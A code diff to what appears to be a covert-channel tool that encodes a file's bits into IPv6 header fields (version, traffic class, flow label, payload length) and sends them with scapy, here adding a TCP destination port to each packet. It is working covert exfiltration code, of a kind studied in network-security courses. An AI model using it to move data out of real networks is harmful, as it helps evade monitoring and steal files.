@@ -1062,8 +1062,12 @@ def __transfer_file_dst_addr_error_handler(field: str, header: str):
     print(constants.RETURN_MAIN_MENU_MSG)
     print(constants.MENU_CLOSING_BANNER)
 
+# ===================== IPV6 INSERT COVERT DATA FUNCTIONS =====================
 
-def transfer_file_ipv6_version(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv6_version(client_sock: socket.socket,
+                               dest_ip: str,
+                               dest_port: int,
+                               file_path: str):
     """
     Hides file data covertly in IPv6 headers using the
     version field.
@@ -1076,6 +1080,9 @@ def transfer_file_ipv6_version(client_sock: socket.socket, dest_ip: str, file_pa
 
     @param dest_ip:
         A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
 
     @param file_path:
         A string representing the path of the file
@@ -1094,7 +1101,7 @@ def transfer_file_ipv6_version(client_sock: socket.socket, dest_ip: str, file_pa
     for i in range(0, len(binary_data), 4):
         binary_segment = binary_data[i:i + 4].ljust(4, '0')
         version = int(binary_segment, 2)
-        packet = IPv6(dst=dest_ip, version=version)
+        packet = IPv6(dst=dest_ip, version=version) / TCP(dport=dest_port)
         packets.append(packet)
 
     # d) Send total number of packets to the client
@@ -1109,7 +1116,10 @@ def transfer_file_ipv6_version(client_sock: socket.socket, dest_ip: str, file_pa
         send(packet, verbose=0)
 
 
-def transfer_file_ipv6_traffic_class(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv6_traffic_class(client_sock: socket.socket,
+                                     dest_ip: str,
+                                     dest_port: int,
+                                     file_path: str):
     """
     Hides file data covertly in IPv6 headers using the
     traffic class field.
@@ -1122,6 +1132,9 @@ def transfer_file_ipv6_traffic_class(client_sock: socket.socket, dest_ip: str, f
 
     @param dest_ip:
         A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
 
     @param file_path:
         A string representing the path of the file
@@ -1140,7 +1153,7 @@ def transfer_file_ipv6_traffic_class(client_sock: socket.socket, dest_ip: str, f
     for i in range(0, len(binary_data), 8):
         binary_segment = binary_data[i:i + 8].ljust(8, '0')
         traffic_class = int(binary_segment, 2)
-        packet = IPv6(dst=dest_ip, tc=traffic_class)
+        packet = IPv6(dst=dest_ip, tc=traffic_class) / TCP(dport=dest_port)
         packets.append(packet)
 
     # d) Send total number of packets to the client
@@ -1155,7 +1168,10 @@ def transfer_file_ipv6_traffic_class(client_sock: socket.socket, dest_ip: str, f
         send(packet, verbose=0)
 
 
-def transfer_file_ipv6_flow_label(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv6_flow_label(client_sock: socket.socket,
+                                  dest_ip: str,
+                                  dest_port: int,
+                                  file_path: str):
     """
     Hides file data covertly in IPv6 headers using the
     flow label field.
@@ -1168,6 +1184,9 @@ def transfer_file_ipv6_flow_label(client_sock: socket.socket, dest_ip: str, file
 
     @param dest_ip:
         A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
 
     @param file_path:
         A string representing the path of the file
@@ -1186,7 +1205,7 @@ def transfer_file_ipv6_flow_label(client_sock: socket.socket, dest_ip: str, file
     for i in range(0, len(binary_data), 20):
         binary_segment = binary_data[i:i + 20].ljust(20, '0')
         flow_label = int(binary_segment, 2)
-        packet = IPv6(dst=dest_ip, fl=flow_label)
+        packet = IPv6(dst=dest_ip, fl=flow_label) / TCP(dport=dest_port)
         packets.append(packet)
 
     # d) Send total number of packets to the client
@@ -1201,7 +1220,10 @@ def transfer_file_ipv6_flow_label(client_sock: socket.socket, dest_ip: str, file
         send(packet, verbose=0)
 
 
-def transfer_file_ipv6_payload_length(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv6_payload_length(client_sock: socket.socket,
+                                      dest_ip: str,
+                                      dest_port: int,
+                                      file_path: str):
     """
     Hides file data covertly in IPv6 headers using the
     payload length field.
@@ -1214,6 +1236,9 @@ def transfer_file_ipv6_payload_length(client_sock: socket.socket, dest_ip: str, 
 
     @param dest_ip:
         A string representing the destination/target IP
+
+    @param dest_port:
+        A string representing the destination/target port
 
     @param file_path:
         A string representing the path of the file
@@ -1232,7 +1257,7 @@ def transfer_file_ipv6_payload_length(client_sock: socket.socket, dest_ip: str, 
     for i in range(0, len(binary_data), 16):
         binary_segment = binary_data[i:i + 16].ljust(16, '0')
         payload_length = int(binary_segment, 2)
-        packet = IPv6(dst=dest_ip, payloadlen=payload_length)
+        packet = IPv6(dst=dest_ip, plen=payload_length) / TCP(dport=dest_port)
         packets.append(packet)
 
     # d) Send total number of packets to the client
@@ -1342,6 +1367,10 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int,
                 if constants.DESTINATION_ADDRESS_FIELD in choices:
                     __transfer_file_dst_addr_error_handler(choices[1], choices[0])
                     return None
+
+                # IPv6 Handlers
+                elif constants.IPV6 in choices:
+                    selected_function(sock, dest_ip, dest_port, file_path)
 
                 # If choice covert with source IP address field
                 elif constants.SOURCE_ADDRESS_FIELD in choices:
